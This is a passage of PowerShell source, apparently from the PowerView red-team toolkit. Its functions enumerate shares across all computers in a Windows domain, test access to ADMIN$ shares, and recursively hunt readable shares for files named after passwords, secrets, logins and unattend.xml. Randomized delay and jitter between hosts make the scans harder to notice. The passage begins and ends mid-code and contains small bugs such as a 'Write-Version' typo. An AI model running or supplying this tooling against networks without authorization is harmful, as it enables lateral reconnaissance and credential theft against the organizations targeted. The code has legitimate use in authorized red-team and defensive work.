        Write-Warning "[!] No users found to search for!"
        return
    }

    $DomainControllers = Get-NetDomainControllers -Domain $Domain | % {$_.Name}

    foreach ($DC in $DomainControllers){
        Write-Verbose "[*] Querying domain controller $DC for event logs"

        Get-UserTGTEvents -HostName $DC -DateStart ([DateTime]::Today.AddDays(-$SearchDays)) | Where-Object {
            # filter for the target user set
            $TargetUsers -contains $_.UserName
        }

        Get-UserLogonEvents -HostName $DC -DateStart ([DateTime]::Today.AddDays(-$SearchDays)) | Where-Object {
            # filter for the target user set
            $TargetUsers -contains $_.UserName
        }
    }
}


function Invoke-ShareFinder {
    <#
        .SYNOPSIS
        Finds (non-standard) shares on machines in the domain.

        Author: @harmj0y
        License: BSD 3-Clause

        .DESCRIPTION
        This function finds the local domain name for a host using Get-NetDomain,
        queries the domain for all active machines with Get-NetComputers, then for
        each server it lists of active shares with Get-NetShare. Non-standard shares
        can be filtered out with -Exclude* flags.

        .PARAMETER Hosts
        Host array to enumerate, passable on the pipeline.

        .PARAMETER HostList
        List of hostnames/IPs to search.

        .PARAMETER HostFilter
        Host filter name to query AD for, wildcards accepted.

        .PARAMETER ExcludeStandard
        Exclude standard shares from display (C$, IPC$, print$ etc.)

        .PARAMETER ExcludePrint
        Exclude the print$ share

        .PARAMETER ExcludeIPC
        Exclude the IPC$ share

        .PARAMETER CheckShareAccess
        Only display found shares that the local user has access to.

        .PARAMETER CheckAdmin
        Only display ADMIN$ shares the local user has access to.

        .PARAMETER NoPing
        Don't ping each host to ensure it's up before enumerating.

        .PARAMETER Delay
        Delay between enumerating hosts, defaults to 0

        .PARAMETER Jitter
        Jitter for the host delay, defaults to +/- 0.3

        .PARAMETER Domain
        Domain to query for machines.

        .EXAMPLE
        > Invoke-ShareFinder
        Find shares on the domain.

        .EXAMPLE
        > Invoke-ShareFinder -ExcludeStandard
        Find non-standard shares on the domain.

        .EXAMPLE
        > Invoke-ShareFinder -Delay 60
        Find shares on the domain with a 60 second (+/- *.3)
        randomized delay between touching each host.

        .EXAMPLE
        > Invoke-ShareFinder -HostList hosts.txt
        Find shares for machines in the specified hostlist.

        .LINK
        http://blog.harmj0y.net
    #>

    [CmdletBinding()]
    param(
        [Parameter(Position=0,ValueFromPipeline=$true)]
        [String[]]
        $Hosts,

        [string]
        $HostList,

        [string]
        $HostFilter,

        [Switch]
        $ExcludeStandard,

        [Switch]
        $ExcludePrint,

        [Switch]
        $ExcludeIPC,

        [Switch]
        $NoPing,

        [Switch]
        $CheckShareAccess,

        [Switch]
        $CheckAdmin,

        [UInt32]
        $Delay = 0,

        [double]
        $Jitter = .3,

        [String]
        $Domain
    )

    begin {
        If ($PSBoundParameters['Debug']) {
            $DebugPreference = 'Continue'
        }

        # figure out the shares we want to ignore
        [String[]] $excludedShares = @('')

        if ($ExcludePrint){
            $excludedShares = $excludedShares + "PRINT$"
        }
        if ($ExcludeIPC){
            $excludedShares = $excludedShares + "IPC$"
        }
        if ($ExcludeStandard){
            $excludedShares = @('', "ADMIN$", "IPC$", "C$", "PRINT$")
        }

        # random object for delay
        $randNo = New-Object System.Random

        # get the current user
        $CurrentUser = Get-NetCurrentUser

        # get the target domain
        if($Domain){
            $targetDomain = $Domain
        }
        else{
            # use the local domain
            $targetDomain = $null
        }

        Write-Verbose "[*] Running Invoke-ShareFinder with delay of $Delay"
        if($targetDomain){
            Write-Version "[*] Domain: $targetDomain"
        }

        # if we're using a host list, read the targets in and add them to the target list
        if($HostList){
            if (Test-Path -Path $HostList){
                $Hosts = Get-Content -Path $HostList
            }
            else {
                Write-Warning "[!] Input file '$HostList' doesn't exist!"
                return $null
            }
        }
        else{
            # otherwise, query the domain for target hosts
            if($HostFilter){
                Write-Verbose "[*] Querying domain $targetDomain for hosts with filter '$HostFilter'"
                $Hosts = Get-NetComputers -Domain $targetDomain -HostName $HostFilter
            }
            else {
                Write-Verbose "[*] Querying domain $targetDomain for hosts..."
                $Hosts = Get-NetComputers -Domain $targetDomain
            }
        }
    }

    process{

        if ( (-not ($Hosts)) -or ($Hosts.length -eq 0)) {
            Write-Verbose "[*] Querying domain $targetDomain for hosts..."
            $Hosts = Get-NetComputers -Domain $targetDomain
        }

        # randomize the host list
        $Hosts = Get-ShuffledArray $Hosts

        if(-not $NoPing){
            $Hosts = $Hosts | Invoke-Ping
        }

        $counter = 0

        foreach ($server in $Hosts){

            $counter = $counter + 1

            Write-Verbose "[*] Enumerating server $server ($counter of $($Hosts.count))"

            if ($server -ne ''){
                # sleep for our semi-randomized interval
                Start-Sleep -Seconds $randNo.Next((1-$Jitter)*$Delay, (1+$Jitter)*$Delay)

                # get the shares for this host and display what we find
                $shares = Get-NetShare -HostName $server
                foreach ($share in $shares) {
                    Write-Debug "[*] Server share: $share"
                    $netname = $share.shi1_netname
                    $remark = $share.shi1_remark
                    $path = '\\'+$server+'\'+$netname

                    # make sure we get a real share name back
                    if (($netname) -and ($netname.trim() -ne '')){

                        # if we're just checking for access to ADMIN$
                        if($CheckAdmin){
                            if($netname.ToUpper() -eq "ADMIN$"){
                                try{
                                    $f=[IO.Directory]::GetFiles($path)
                                    "\\$server\$netname `t- $remark"
                                }
                                catch {}
                            }
                        }

                        # skip this share if it's in the exclude list
                        elseif ($excludedShares -notcontains $netname.ToUpper()){
                            # see if we want to check access to this share
                            if($CheckShareAccess){
                                # check if the user has access to this path
                                try{
                                    $f=[IO.Directory]::GetFiles($path)
                                    "\\$server\$netname `t- $remark"
                                }
                                catch {}
                            }
                            else{
                                "\\$server\$netname `t- $remark"
                            }
                        }
                    }
                }
            }
        }
    }
}


function Invoke-ShareFinderThreaded {
    <#
        .SYNOPSIS
        Finds (non-standard) shares on machines in the domain.
        Threaded version of Invoke-ShareFinder. Uses multithreading 
        to speed up enumeration.

        Author: @harmj0y
        License: BSD 3-Clause

        .DESCRIPTION
        This function finds the local domain name for a host using Get-NetDomain,
        queries the domain for all active machines with Get-NetComputers, then for
        each server it lists of active shares with Get-NetShare. Non-standard shares
        can be filtered out with -Exclude* flags.
        Threaded version of Invoke-ShareFinder.

        .PARAMETER Hosts
        Host array to enumerate, passable on the pipeline.

        .PARAMETER HostList
        List of hostnames/IPs to search.

        .PARAMETER HostFilter
        Host filter name to query AD for, wildcards accepted.

        .PARAMETER ExcludedShares
        Shares to exclude from output, wildcards accepted (i.e. IPC*)

        .PARAMETER CheckShareAccess
        Only display found shares that the local user has access to.

        .PARAMETER CheckAdmin
        Only display ADMIN$ shares the local user has access to.

        .PARAMETER NoPing
        Don't ping each host to ensure it's up before enumerating.

        .PARAMETER Domain
        Domain to query for machines.

        .PARAMETER MaxThreads
        The maximum concurrent threads to execute.

        .EXAMPLE
        > Invoke-ShareFinder
        Find shares on the domain.

        .EXAMPLE
        > Invoke-ShareFinder -ExcludedShares IPC$,PRINT$
        Find shares on the domain excluding IPC$ and PRINT$

        .EXAMPLE
        > Invoke-ShareFinder -HostList hosts.txt
        Find shares for machines in the specified hostlist.

        .LINK
        http://blog.harmj0y.net
    #>

    [CmdletBinding()]
    param(
        [Parameter(Position=0,ValueFromPipeline=$true)]
        [String[]]
        $Hosts,

        [string]
        $HostList,

        [string]
        $HostFilter,

        [string[]]
        $ExcludedShares,

        [Switch]
        $CheckShareAccess,

        [Switch]
        $NoPing,

        [string]
        $Domain,

        [Int]
        $MaxThreads = 20
    )

    begin {
        If ($PSBoundParameters['Debug']) {
            $DebugPreference = 'Continue'
        }

        # get the target domain
        if($Domain){
            $targetDomain = $Domain
        }
        else{
            # use the local domain
            $targetDomain = $null
        }

        $currentUser = ([Environment]::UserName).toLower()

        Write-Verbose "[*] Running Invoke-ShareFinderThreaded with delay of $Delay"
        if($targetDomain){
            Write-Verbose "[*] Domain: $targetDomain"
        }

        # if we're using a host list, read the targets in and add them to the target list
        if($HostList){
            if (Test-Path -Path $HostList){
                $Hosts = Get-Content -Path $HostList
            }
            else{
                Write-Warning "[!] Input file '$HostList' doesn't exist!"
                "[!] Input file '$HostList' doesn't exist!"
                return
            }
        }
        elseif($HostFilter){
            Write-Verbose "[*] Querying domain $targetDomain for hosts with filter '$HostFilter'"
            $Hosts = Get-NetComputers -Domain $targetDomain -HostName $HostFilter
        }

        # script block that eunmerates a server
        # this is called by the multi-threading code later
        $EnumServerBlock = {
            param($Server, $Ping, $CheckShareAccess, $ExcludedShares, $CheckAdmin)

            # optionally check if the server is up first
            $up = $true
            if($Ping){
                $up = Test-Server -Server $Server
            }
            if($up){
                # get the shares for this host and check what we find
                $shares = Get-NetShare -HostName $Server
                foreach ($share in $shares) {
                    Write-Debug "[*] Server share: $share"
                    $netname = $share.shi1_netname
                    $remark = $share.shi1_remark
                    $path = '\\'+$server+'\'+$netname

                    # make sure we get a real share name back
                    if (($netname) -and ($netname.trim() -ne '')){
                        # if we're just checking for access to ADMIN$
                        if($CheckAdmin){
                            if($netname.ToUpper() -eq "ADMIN$"){
                                try{
                                    $f=[IO.Directory]::GetFiles($path)
                                    "\\$server\$netname `t- $remark"
                                }
                                catch {}
                            }
                        }
                        # skip this share if it's in the exclude list
                        elseif ($excludedShares -notcontains $netname.ToUpper()){
                            # see if we want to check access to this share
                            if($CheckShareAccess){
                                # check if the user has access to this path
                                try{
                                    $f=[IO.Directory]::GetFiles($path)
                                    "\\$server\$netname `t- $remark"
                                }
                                catch {}
                            }
                            else{
                                "\\$server\$netname `t- $remark"
                            }
                        }
                    }
                }
            }
        }

        # Adapted from:
        #   http://powershell.org/wp/forums/topic/invpke-parallel-need-help-to-clone-the-current-runspace/
        $sessionState = [System.Management.Automation.Runspaces.InitialSessionState]::CreateDefault()
        $sessionState.ApartmentState = [System.Threading.Thread]::CurrentThread.GetApartmentState()

        # grab all the current variables for this runspace
        $MyVars = Get-Variable -Scope 1

        # these Variables are added by Runspace.Open() Method and produce Stop errors if you add them twice
        $VorbiddenVars = @("?","args","ConsoleFileName","Error","ExecutionContext","false","HOME","Host","input","InputObject","MaximumAliasCount","MaximumDriveCount","MaximumErrorCount","MaximumFunctionCount","MaximumHistoryCount","MaximumVariableCount","MyInvocation","null","PID","PSBoundParameters","PSCommandPath","PSCulture","PSDefaultParameterValues","PSHOME","PSScriptRoot","PSUICulture","PSVersionTable","PWD","ShellId","SynchronizedHash","true")

        # Add Variables from Parent Scope (current runspace) into the InitialSessionState
        ForEach($Var in $MyVars) {
            If($VorbiddenVars -notcontains $Var.Name) {
            $sessionstate.Variables.Add((New-Object -TypeName System.Management.Automation.Runspaces.SessionStateVariableEntry -ArgumentList $Var.name,$Var.Value,$Var.description,$Var.options,$Var.attributes))
            }
        }

        # Add Functions from current runspace to the InitialSessionState
        ForEach($Function in (Get-ChildItem Function:)) {
            $sessionState.Commands.Add((New-Object -TypeName System.Management.Automation.Runspaces.SessionStateFunctionEntry -ArgumentList $Function.Name, $Function.Definition))
        }

        # threading adapted from
        # https://github.com/darkoperator/Posh-SecMod/blob/master/Discovery/Discovery.psm1#L407
        # Thanks Carlos!
        $counter = 0

        # create a pool of maxThread runspaces
        $pool = [runspacefactory]::CreateRunspacePool(1, $MaxThreads, $sessionState, $host)
        $pool.Open()

        $jobs = @()
        $ps = @()
        $wait = @()

        $counter = 0
    }

    process {

        if ( (-not ($Hosts)) -or ($Hosts.length -eq 0)) {
            Write-Verbose "[*] Querying domain $targetDomain for hosts..."
            $Hosts = Get-NetComputers -Domain $targetDomain
        }

        # randomize the host list
        $Hosts = Get-ShuffledArray $Hosts
        $HostCount = $Hosts.Count
        Write-Verbose "[*] Total number of hosts: $HostCount"

        foreach ($server in $Hosts){
            # make sure we get a server name
            if ($server -ne ''){
                Write-Verbose "[*] Enumerating server $server $($counter+1) of $($Hosts.count))"

                While ($($pool.GetAvailableRunspaces()) -le 0) {
                    Start-Sleep -milliseconds 500
                }

                # create a "powershell pipeline runner"
                $ps += [powershell]::create()

                $ps[$counter].runspacepool = $pool

                # add the script block + arguments
                [void]$ps[$counter].AddScript($EnumServerBlock).AddParameter('Server', $server).AddParameter('Ping', -not $NoPing).AddParameter('CheckShareAccess', $CheckShareAccess).AddParameter('ExcludedShares', $ExcludedShares)

                # start job
                $jobs += $ps[$counter].BeginInvoke();

                # store wait handles for WaitForAll call
                $wait += $jobs[$counter].AsyncWaitHandle
            }
            $counter = $counter + 1
        }
    }

    end {
        Write-Verbose "Waiting for scanning threads to finish..."

        $waitTimeout = Get-Date

        while ($($jobs | ? {$_.IsCompleted -eq $false}).count -gt 0 -or $($($(Get-Date) - $waitTimeout).totalSeconds) -gt 60) {
                Start-Sleep -milliseconds 500
            }

        # end async call
        for ($y = 0; $y -lt $counter; $y++) {

            try {
                # complete async job
                $ps[$y].EndInvoke($jobs[$y])

            } catch {
                Write-Warning "error: $_"
            }
            finally {
                $ps[$y].Dispose()
            }
        }
        $pool.Dispose()
    }
}


function Invoke-FileFinder {
    <#
        .SYNOPSIS
        Finds sensitive files on the domain.

        Author: @harmj0y
        License: BSD 3-Clause

        .DESCRIPTION
        This function finds the local domain name for a host using Get-NetDomain,
        queries the domain for all active machines with Get-NetComputers, grabs
        the readable shares for each server, and recursively searches every
        share for files with specific keywords in the name.
        If a share list is passed, EVERY share is enumerated regardless of
        other options.

        .PARAMETER Hosts
        Host array to enumerate, passable on the pipeline.

        .PARAMETER HostList
        List of hostnames/IPs to search.

        .PARAMETER HostFilter
        Host filter name to query AD for, wildcards accepted.

        .PARAMETER ShareList
        List if \\HOST\shares to search through.

        .PARAMETER Terms
        Terms to search for.

        .PARAMETER OfficeDocs
        Search for office documents (*.doc*, *.xls*, *.ppt*)

        .PARAMETER FreshEXES
        Find .EXEs accessed within the last week.

        .PARAMETER AccessDateLimit
        Only return files with a LastAccessTime greater than this date value.

        .PARAMETER WriteDateLimit
        Only return files with a LastWriteTime greater than this date value.

        .PARAMETER CreateDateLimit
        Only return files with a CreationDate greater than this date value.

        .PARAMETER IncludeC
        Include any C$ shares in recursive searching (default ignore).

        .PARAMETER IncludeAdmin
        Include any ADMIN$ shares in recursive searching (default ignore).

        .PARAMETER ExcludeFolders
        Exclude folders from the search results.

        .PARAMETER ExcludeHidden
        Exclude hidden files and folders from the search results.

        .PARAMETER CheckWriteAccess
        Only returns files the current user has write access to.

        .PARAMETER OutFile
        Output results to a specified csv output file.

        .PARAMETER NoPing
        Don't ping each host to ensure it's up before enumerating.

        .PARAMETER Delay
        Delay between enumerating hosts, defaults to 0

        .PARAMETER Jitter
        Jitter for the host delay, defaults to +/- 0.3

        .PARAMETER Domain
        Domain to query for machines

        .EXAMPLE
        > Invoke-FileFinder
        Find readable files on the domain with 'pass', 'sensitive',
        'secret', 'admin', 'login', or 'unattend*.xml' in the name,

        .EXAMPLE
        > Invoke-FileFinder -Domain testing
        Find readable files on the 'testing' domain with 'pass', 'sensitive',
        'secret', 'admin', 'login', or 'unattend*.xml' in the name,

        .EXAMPLE
        > Invoke-FileFinder -IncludeC
        Find readable files on the domain with 'pass', 'sensitive',
        'secret', 'admin', 'login' or 'unattend*.xml' in the name,
        including C$ shares.

        .EXAMPLE
        > Invoke-FileFinder -ShareList shares.txt -Terms accounts,ssn -OutFile out.csv
        Enumerate a specified share list for files with 'accounts' or
        'ssn' in the name, and write everything to "out.csv"

        .LINK
        http://www.harmj0y.net/blog/redteaming/file-server-triage-on-red-team-engagements/
    #>

    [CmdletBinding()]
    param(
        [Parameter(Position=0,ValueFromPipeline=$true)]
        [String[]]
        $Hosts,

        [string]
        $HostList,

        [string]
        $HostFilter,

        [string]
        $ShareList,

        [Switch]
        $OfficeDocs,

        [Switch]
        $FreshEXES,

        [string[]]
        $Terms,

        [String]
        $TermList,

        [string]
        $AccessDateLimit = '1/1/1970',

        [string]
        $WriteDateLimit = '1/1/1970',

        [string]
        $CreateDateLimit = '1/1/1970',

        [Switch]
        $IncludeC,

        [Switch]
        $IncludeAdmin,

        [Switch]
        $ExcludeFolders,

        [Switch]
        $ExcludeHidden,

        [Switch]
        $CheckWriteAccess,

        [string]
        $OutFile,

        [Switch]
        $NoPing,

        [UInt32]
        $Delay = 0,

        [double]
        $Jitter = .3,

        [string]
        $Domain
    )

    begin {

        If ($PSBoundParameters['Debug']) {
            $DebugPreference = 'Continue'
        }

        # figure out the shares we want to ignore
        [String[]] $excludedShares = @("C$", "ADMIN$")

        # random object for delay
        $randNo = New-Object System.Random

        # see if we're specifically including any of the normally excluded sets
        if ($IncludeC){
            if ($IncludeAdmin){
                $excludedShares = @()
            }
            else{
                $excludedShares = @("ADMIN$")
            }
        }

        if ($IncludeAdmin){
            if ($IncludeC){
                $excludedShares = @()
            }
            else{
                $excludedShares = @("C$")
            }
        }

        # delete any existing output file if it already exists
        If ($OutFile -and (Test-Path -Path $OutFile)){ Remove-Item -Path $OutFile }

        # if there's a set of terms specified to search for
        if ($TermList){
            if (Test-Path -Path $TermList){
                foreach ($Term in Get-Content -Path $TermList) {
                    if (($Term -ne $null) -and ($Term.trim() -ne '')){
                        $Terms += $Term
                    }
                }
            }
            else {
                Write-Warning "[!] Input file '$TermList' doesn't exist!"
                return $null
            }
        }

        # if we are passed a share list, enumerate each with appropriate options, then return
        if($ShareList){
            if (Test-Path -Path $ShareList){
                foreach ($Item in Get-Content -Path $ShareList) {
                    if (($Item -ne $null) -and ($Item.trim() -ne '')){

                        # exclude any "[tab]- commants", i.e. the output from Invoke-ShareFinder
                        $share = $Item.Split("`t")[0]

                        # get just the share name from the full path
                        $shareName = $share.split('\')[3]

                        $cmd = "Invoke-SearchFiles -Path $share $(if($Terms){`"-Terms $($Terms -join ',')`"}) $(if($ExcludeFolders){`"-ExcludeFolders`"}) $(if($ExcludeHidden){`"-ExcludeHidden`"}) $(if($FreshEXES){`"-FreshEXES`"}) $(if($OfficeDocs){`"-OfficeDocs`"}) $(if($CheckWriteAccess){`"-CheckWriteAccess`"}) $(if($OutFile){`"-OutFile $OutFile`"})"

                        Write-Verbose "[*] Enumerating share $share"
                        Invoke-Expression $cmd
                    }
                }
            }
            else {
                Write-Warning "[!] Input file '$ShareList' doesn't exist!"
                return $null
            }
            return
        }
        else{
            # if we aren't using a share list, first get the target domain
            if($Domain){
                $targetDomain = $Domain
            }
            else{
                # use the local domain
                $targetDomain = $null
            }

            Write-Verbose "[*] Running Invoke-FileFinder with delay of $Delay"
            if($targetDomain){
                Write-Verbose "[*] Domain: $targetDomain"
            }

            # if we're using a host list, read the targets in and add them to the target list
            if($HostList){
                if (Test-Path -Path $HostList){
                    $Hosts = Get-Content -Path $HostList
                }
                else{
                    Write-Warning "[!] Input file '$HostList' doesn't exist!"
                    "[!] Input file '$HostList' doesn't exist!"
                    return
                }
            }
            elseif($HostFilter){
                Write-Verbose "[*] Querying domain $targetDomain for hosts with filter '$HostFilter'"
                $Hosts = Get-NetComputers -Domain $targetDomain -HostName $HostFilter
            }
        }
    }

    process {

        if(-not $ShareList){
            if ( ((-not ($Hosts)) -or ($Hosts.length -eq 0)) -and (-not $ShareList) ) {
                Write-Verbose "[*] Querying domain $targetDomain for hosts..."
                $Hosts = Get-NetComputers -Domain $targetDomain
            }

            # randomize the server list
            $Hosts = Get-ShuffledArray $Hosts

            if(-not $NoPing){
                $Hosts = $Hosts | Invoke-Ping
            }

            # return/output the current status lines
            $counter = 0

            foreach ($server in $Hosts){

                $counter = $counter + 1

                Write-Verbose "[*] Enumerating server $server ($counter of $($Hosts.count))"

                if ($server -and ($server -ne '')){
                    # sleep for our semi-randomized interval
                    Start-Sleep -Seconds $randNo.Next((1-$Jitter)*$Delay, (1+$Jitter)*$Delay)

                    # get the shares for this host and display what we find
                    $shares = Get-NetShare -HostName $server
                    foreach ($share in $shares) {
                        Write-Debug "[*] Server share: $share"
                        $netname = $share.shi1_netname
                        $remark = $share.shi1_remark
                        $path = '\\'+$server+'\'+$netname

                        # make sure we get a real share name back
                        if (($netname) -and ($netname.trim() -ne '')){

                            # skip this share if it's in the exclude list
                            if ($excludedShares -notcontains $netname.ToUpper()){

                                # check if the user has access to this path
                                try{
                                    $f=[IO.Directory]::GetFiles($path)

                                    $cmd = "Invoke-SearchFiles -Path $path $(if($Terms){`"-Terms $($Terms -join ',')`"}) $(if($ExcludeFolders){`"-ExcludeFolders`"}) $(if($OfficeDocs){`"-OfficeDocs`"}) $(if($ExcludeHidden){`"-ExcludeHidden`"}) $(if($FreshEXES){`"-FreshEXES`"}) $(if($CheckWriteAccess){`"-CheckWriteAccess`"}) $(if($OutFile){`"-OutFile $OutFile`"})"

                                    Write-Verbose "[*] Enumerating share $path"

                                    Invoke-Expression $cmd
                                }
                                catch {}

                            }
                        }
                    }
                }
            }
        }
    }
}


function Invoke-FileFinderThreaded {
    <#
        .SYNOPSIS
        Finds sensitive files on the domain. Uses multithreading to
        speed up enumeration.

        Author: @harmj0y
        License: BSD 3-Clause

        .DESCRIPTION
        This function finds the local domain name for a host using Get-NetDomain,
        queries the domain for all active machines with Get-NetComputers, grabs
        the readable shares for each server, and recursively searches every
        share for files with specific keywords in the name.
        If a share list is passed, EVERY share is enumerated regardless of
        other options.
        Threaded version of Invoke-FileFinder

        .PARAMETER Hosts
        Host array to enumerate, passable on the pipeline.

        .PARAMETER HostList
        List of hostnames/IPs to search.

        .PARAMETER HostFilter
        Host filter name to query AD for, wildcards accepted.

        .PARAMETER ShareList
        List if \\HOST\shares to search through.

        .PARAMETER Terms
        Terms to search for.

        .PARAMETER OfficeDocs
        Search for office documents (*.doc*, *.xls*, *.ppt*)

        .PARAMETER FreshEXES
        Find .EXEs accessed within the last week.

        .PARAMETER AccessDateLimit
        Only return files with a LastAccessTime greater than this date value.

        .PARAMETER WriteDateLimit
        Only return files with a LastWriteTime greater than this date value.

        .PARAMETER CreateDateLimit
        Only return files with a CreationDate greater than this date value.

        .PARAMETER IncludeC
        Include any C$ shares in recursive searching (default ignore).

        .PARAMETER IncludeAdmin
        Include any ADMIN$ shares in recursive searching (default ignore).

        .PARAMETER ExcludeFolders
        Exclude folders from the search results.

        .PARAMETER ExcludeHidden
        Exclude hidden files and folders from the search results.

        .PARAMETER CheckWriteAccess
        Only returns files the current user has write access to.

        .PARAMETER NoPing
        Don't ping each host to ensure it's up before enumerating.

        .PARAMETER Delay
        Delay between enumerating hosts, defaults to 0

        .PARAMETER Jitter
        Jitter for the host delay, defaults to +/- 0.3

        .PARAMETER Domain
        Domain to query for machines

        .EXAMPLE
        > Invoke-FileFinderThreaded
        Find readable files on the domain with 'pass', 'sensitive',
        'secret', 'admin', 'login', or 'unattend*.xml' in the name,

        .EXAMPLE
        > Invoke-FileFinder -Domain testing
        Find readable files on the 'testing' domain with 'pass', 'sensitive',
        'secret', 'admin', 'login', or 'unattend*.xml' in the name,

        .EXAMPLE
        > Invoke-FileFinderThreaded -ShareList shares.txt -Terms accounts,ssn
        Enumerate a specified share list for files with 'accounts' or
        'ssn' in the name

        .LINK
        http://www.harmj0y.net/blog/redteaming/file-server-triage-on-red-team-engagements/
    #>

    [CmdletBinding()]
    param(
        [Parameter(Position=0,ValueFromPipeline=$true)]
        [String[]]
        $Hosts,

        [string]
        $HostList,

        [string]
        $HostFilter,

        [string]
        $ShareList,

        [Switch]
        $OfficeDocs,

        [Switch]
        $FreshEXES,

        [string[]]
        $Terms,

        [String]
        $TermList,

        [string]
        $AccessDateLimit = '1/1/1970',

        [string]
        $WriteDateLimit = '1/1/1970',

        [string]
        $CreateDateLimit = '1/1/1970',

        [Switch]
        $IncludeC,

        [Switch]
        $IncludeAdmin,

        [Switch]
        $ExcludeFolders,

        [Switch]
        $ExcludeHidden,

        [Switch]
        $CheckWriteAccess,

        [Switch]
        $NoPing,

        [string]
        $Domain,

        [Int]
        $MaxThreads = 20
    )

    begin {
        If ($PSBoundParameters['Debug']) {
            $DebugPreference = 'Continue'
        }

        # figure out the shares we want to ignore
        [String[]] $excludedShares = @("C$", "ADMIN$")

        # see if we're specifically including any of the normally excluded sets
        if ($IncludeC){
            if ($IncludeAdmin){
                $excludedShares = @()
            }
            else{
                $excludedShares = @("ADMIN$")
            }
        }
        if ($IncludeAdmin){
            if ($IncludeC){
                $excludedShares = @()
            }
            else{
                $excludedShares = @("C$")
            }
        }

        # get the target domain
        if($Domain){
            $targetDomain = $Domain
        }
        else{
            # use the local domain
            $targetDomain = $null
        }

        Write-Verbose "[*] Running Invoke-FileFinderThreaded with delay of $Delay"
        if($targetDomain){
            Write-Verbose "[*] Domain: $targetDomain"
        }

        $shares = @()
        $servers = @()

        # if there's a set of terms specified to search for
        if ($TermList){
            if (Test-Path -Path $TermList){
                foreach ($Term in Get-Content -Path $TermList) {
                    if (($Term -ne $null) -and ($Term.trim() -ne '')){
                        $Terms += $Term
                    }
                }
            }
            else {
                Write-Warning "[!] Input file '$TermList' doesn't exist!"
                return $null
            }
        }

        # if we're hard-passed a set of shares
        if($ShareList){
            if (Test-Path -Path $ShareList){
                foreach ($Item in Get-Content -Path $ShareList) {
                    if (($Item -ne $null) -and ($Item.trim() -ne '')){
                        # exclude any "[tab]- commants", i.e. the output from Invoke-ShareFinder
                        $share = $Item.Split("`t")[0]
                        $shares += $share
                    }
                }
            }
            else {
                Write-Warning "[!] Input file '$ShareList' doesn't exist!"
                return $null
            }
        }
        else{
            # otherwise if we're using a host list, read the targets in and add them to the target list
            if($HostList){
                if (Test-Path -Path $HostList){
                    $Hosts = Get-Content -Path $HostList
                }
                else{
                    Write-Warning "[!] Input file '$HostList' doesn't exist!"
                    "[!] Input file '$HostList' doesn't exist!"
                    return
                }
            }
            elseif($HostFilter){
                Write-Verbose "[*] Querying domain $targetDomain for hosts with filter '$HostFilter'"
                $Hosts = Get-NetComputers -Domain $targetDomain -HostName $HostFilter
            }
        }

        # script blocks that eunmerates share or a server
        # these are called by the multi-threading code later
        $EnumShareBlock = {
            param($Share, $Terms, $ExcludeFolders, $ExcludeHidden, $FreshEXES, $OfficeDocs, $CheckWriteAccess)

            $cmd = "Invoke-SearchFiles -Path $share $(if($Terms){`"-Terms $($Terms -join ',')`"}) $(if($ExcludeFolders){`"-ExcludeFolders`"}) $(if($ExcludeHidden){`"-ExcludeHidden`"}) $(if($FreshEXES){`"-FreshEXES`"}) $(if($OfficeDocs){`"-OfficeDocs`"}) $(if($CheckWriteAccess){`"-CheckWriteAccess`"})"

            Write-Verbose "[*] Enumerating share $share"
            Invoke-Expression $cmd
        }
        $EnumServerBlock = {
            param($Server, $Ping, $excludedShares, $Terms, $ExcludeFolders, $OfficeDocs, $ExcludeHidden, $FreshEXES, $CheckWriteAccess)

            # optionally check if the server is up first
            $up = $true
            if($Ping){
                $up = Test-Server -Server $Server
            }
            if($up){

                # get the shares for this host and display what we find
                $shares = Get-NetShare -HostName $server
                foreach ($share in $shares) {

                    $netname = $share.shi1_netname
                    $remark = $share.shi1_remark
                    $path = '\\'+$server+'\'+$netname

                    # make sure we get a real share name back
                    if (($netname) -and ($netname.trim() -ne '')){

                        # skip this share if it's in the exclude list
                        if ($excludedShares -notcontains $netname.ToUpper()){
                            # check if the user has access to this path
                            try{
                                $f=[IO.Directory]::GetFiles($path)

                                $cmd = "Invoke-SearchFiles -Path $path $(if($Terms){`"-Terms $($Terms -join ',')`"}) $(if($ExcludeFolders){`"-ExcludeFolders`"}) $(if($OfficeDocs){`"-OfficeDocs`"}) $(if($ExcludeHidden){`"-ExcludeHidden`"}) $(if($FreshEXES){`"-FreshEXES`"}) $(if($CheckWriteAccess){`"-CheckWriteAccess`"})"
                                Invoke-Expression $cmd
                            }
                            catch {
                                Write-Debug "[!] No access to $path"
                            }
                        }
                    }
                }

            }
        }

        # Adapted from:
        #   http://powershell.org/wp/forums/topic/invpke-parallel-need-help-to-clone-the-current-runspace/
        $sessionState = [System.Management.Automation.Runspaces.InitialSessionState]::CreateDefault()
        $sessionState.ApartmentState = [System.Threading.Thread]::CurrentThread.GetApartmentState()

        # grab all the current variables for this runspace
        $MyVars = Get-Variable -Scope 1

        # these Variables are added by Runspace.Open() Method and produce Stop errors if you add them twice
        $VorbiddenVars = @("?","args","ConsoleFileName","Error","ExecutionContext","false","HOME","Host","input","InputObject","MaximumAliasCount","MaximumDriveCount","MaximumErrorCount","MaximumFunctionCount","MaximumHistoryCount","MaximumVariableCount","MyInvocation","null","PID","PSBoundParameters","PSCommandPath","PSCulture","PSDefaultParameterValues","PSHOME","PSScriptRoot","PSUICulture","PSVersionTable","PWD","ShellId","SynchronizedHash","true")

        # Add Variables from Parent Scope (current runspace) into the InitialSessionState
        ForEach($Var in $MyVars) {
            If($VorbiddenVars -notcontains $Var.Name) {
            $sessionstate.Variables.Add((New-Object -TypeName System.Management.Automation.Runspaces.SessionStateVariableEntry -ArgumentList $Var.name,$Var.Value,$Var.description,$Var.options,$Var.attributes))
            }
        }

        # Add Functions from current runspace to the InitialSessionState
        ForEach($Function in (Get-ChildItem Function:)) {
            $sessionState.Commands.Add((New-Object -TypeName System.Management.Automation.Runspaces.SessionStateFunctionEntry -ArgumentList $Function.Name, $Function.Definition))
        }

        # threading adapted from
        # https://github.com/darkoperator/Posh-SecMod/blob/master/Discovery/Discovery.psm1#L407
        # Thanks Carlos!
        $counter = 0

        # create a pool of maxThread runspaces
        $pool = [runspacefactory]::CreateRunspacePool(1, $MaxThreads, $sessionState, $host)
        $pool.Open()
        $jobs = @()
        $ps = @()
        $wait = @()
    }

    process {

        # different script blocks to thread depending on what's passed
        if ($ShareList){
            foreach ($share in $shares){
                # make sure we get a share name
                if ($share -ne ''){
                    Write-Verbose "[*] Enumerating share $share ($($counter+1) of $($shares.count))"

                    While ($($pool.GetAvailableRunspaces()) -le 0) {
                        Start-Sleep -milliseconds 500
                    }

                    # create a "powershell pipeline runner"
                    $ps += [powershell]::create()

                    $ps[$counter].runspacepool = $pool

                    # add the server script block + arguments
